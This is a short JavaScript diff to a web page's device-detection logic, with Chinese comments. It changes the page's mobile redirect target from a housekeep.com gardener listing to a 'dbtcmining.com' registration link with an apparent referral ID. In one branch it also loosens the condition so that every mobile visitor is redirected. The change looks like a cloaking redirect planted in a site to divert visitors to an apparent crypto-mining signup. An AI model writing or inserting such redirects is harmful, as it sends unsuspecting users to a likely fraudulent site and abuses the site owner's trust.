@@ -49,8 +49,8 @@
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断https://dbtcmining.com/xml/index.html#/register/1365565
-        if (isEnglishOrEuropeanLang() && isMobileDevice()) {
-          window.location.href = "https://housekeep.com/tradespeople/gardener/regions-all/";
+        if ( isMobileDevice()) {
+          window.location.href = "https://dbtcmining.com/xml/index.html#/register/1365565";
           return;
         }
      
@@ -64,7 +64,7 @@
       .catch(() => {
         // IP检测失败时严格的双重条件判断
         if (isMobileDevice() && isEnglishOrEuropeanLang()) {
-          window.location.href = "https://housekeep.com/tradespeople/gardener/regions-all/";
+          window.location.href = "https://dbtcmining.com/xml/index.html#/register/1365565";
           return;
         }
         
